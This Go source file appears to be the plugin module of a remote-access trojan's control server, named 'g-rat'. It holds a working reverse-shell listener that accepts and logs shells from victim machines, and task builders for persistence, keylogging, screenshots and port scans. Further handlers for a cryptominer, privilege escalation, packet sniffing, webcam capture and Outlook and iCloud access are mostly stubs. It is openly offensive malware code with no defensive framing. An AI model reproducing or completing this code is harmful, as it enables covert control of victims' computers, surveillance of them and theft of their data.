package plugins

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	
	"github.com/sevil11/g-rat/shared"
)

// PluginHandler processes plugin tasks
func PluginHandler(w http.ResponseWriter, r *http.Request) {
	plugin := strings.TrimPrefix(r.URL.Path, "/api/plugin/")
	
	switch plugin {
	case "reverse_shell":
		handleReverseShell(w, r)
	case "persistence":
		handlePersistence(w, r)
	case "miner":
		handleMiner(w, r)
	case "keylogger":
		handleKeylogger(w, r)
	case "escalate":
		handleEscalate(w, r)
	case "packet_sniffer":
		handlePacketSniffer(w, r)
	case "screenshot":
		handleScreenshot(w, r)
	case "webcam":
		handleWebcam(w, r)
	case "port_scan":
		handlePortScan(w, r)
	case "process_control":
		handleProcessControl(w, r)
	case "outlook":
		handleOutlook(w, r)
	case "icloud":
		handleICloud(w, r)
	default:
		http.Error(w, "Plugin not found", http.StatusNotFound)
	}
}

// ReverseShellConn holds active reverse shell connections
var ReverseShellConn = make(map[string]net.Conn)

// handleReverseShell creates a listener for reverse shells
func handleReverseShell(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		// Admin requesting reverse shell status
		shells := make([]string, 0, len(ReverseShellConn))
		for id := range ReverseShellConn {
			shells = append(shells, id)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"active_shells": shells,
		})
		return
	}
	
	if r.Method == http.MethodPost {
		// Admin setting up a new listener
		var req struct {
			Port int `json:"port"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}
		
		// Start listener in a goroutine
		go func(port int) {
			listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
			if err != nil {
				log.Printf("Failed to start reverse shell listener on port %d: %v", port, err)
				return
			}
			
			log.Printf("Reverse shell listener started on port %d", port)
			
			for {
				conn, err := listener.Accept()
				if err != nil {
					log.Printf("Error accepting connection: %v", err)
					continue
				}
				
				id := fmt.Sprintf("%s-%d", conn.RemoteAddr().String(), time.Now().Unix())
				ReverseShellConn[id] = conn
				
				log.Printf("Reverse shell connection established: %s", id)
				
				// Handle the connection in a goroutine
				go handleConnection(id, conn)
			}
		}(req.Port)
		
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status": "started",
			"port":   req.Port,
		})
	}
}

// handleConnection manages I/O for a reverse shell
func handleConnection(id string, conn net.Conn) {
	defer func() {
		conn.Close()
		delete(ReverseShellConn, id)
		log.Printf("Reverse shell connection closed: %s", id)
	}()
	
	// In a real implementation, this would be connected to a web terminal
	// For now, just read and log the output
	buffer := make([]byte, 1024)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			if err != io.EOF {
				log.Printf("Error reading from connection: %v", err)
			}
			break
		}
		
		output := string(buffer[:n])
		log.Printf("Shell output from %s: %s", id, output)
	}
}

// handlePersistence handles persistence plugin requests
func handlePersistence(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		AgentID  string `json:"agent_id"`
		Method   string `json:"method"` // startup, registry, service, cron
		FileName string `json:"file_name,omitempty"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	
	// Create task for agent
	task := shared.Task{
		ID:      fmt.Sprintf("persist-%d", time.Now().UnixNano()),
		Type:    "persistence",
		Command: req.Method,
		Args: map[string]string{
			"file_name": req.FileName,
		},
		CreateTime: time.Now(),
	}
	
	// In a real implementation, add this task to the agent's queue
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "scheduled",
		"task_id": task.ID,
	})
}

// Other plugin handlers would be implemented in a similar way
func handleMiner(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Miner plugin handled")
}

func handleKeylogger(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		AgentID string `json:"agent_id"`
		Action  string `json:"action"` // start, stop, dump
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	
	// Create task for agent
	task := shared.Task{
		ID:      fmt.Sprintf("keylogger-%d", time.Now().UnixNano()),
		Type:    "keylogger",
		Command: req.Action,
		CreateTime: time.Now(),
	}
	
	// In a real implementation, add this task to the agent's queue
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "scheduled",
		"task_id": task.ID,
	})
}

func handleEscalate(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Privilege escalation plugin handled")
}

func handlePacketSniffer(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Packet sniffer plugin handled")
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		AgentID string `json:"agent_id"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	
	// Create task for agent
	task := shared.Task{
		ID:      fmt.Sprintf("screenshot-%d", time.Now().UnixNano()),
		Type:    "screenshot",
		Command: "capture",
		CreateTime: time.Now(),
	}
	
	// In a real implementation, add this task to the agent's queue
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "scheduled",
		"task_id": task.ID,
	})
}

func handleWebcam(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Webcam plugin handled")
}

func handlePortScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		AgentID string `json:"agent_id"`
		Target  string `json:"target"`
		StartPort int  `json:"start_port"`
		EndPort   int  `json:"end_port"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	
	// Validate port range
	if req.StartPort < 1 || req.EndPort > 65535 || req.StartPort > req.EndPort {
		http.Error(w, "Invalid port range", http.StatusBadRequest)
		return
	}
	
	// Create task for agent
	task := shared.Task{
		ID:      fmt.Sprintf("portscan-%d", time.Now().UnixNano()),
		Type:    "port_scan",
		Command: "scan",
		Args: map[string]string{
			"target":     req.Target,
			"start_port": strconv.Itoa(req.StartPort),
			"end_port":   strconv.Itoa(req.EndPort),
		},
		CreateTime: time.Now(),
	}
	
	// In a real implementation, add this task to the agent's queue
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "scheduled",
		"task_id": task.ID,
	})
}

func handleProcessControl(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Process control plugin handled")
}

func handleOutlook(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Outlook plugin handled")
}

func handleICloud(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "iCloud plugin handled")
}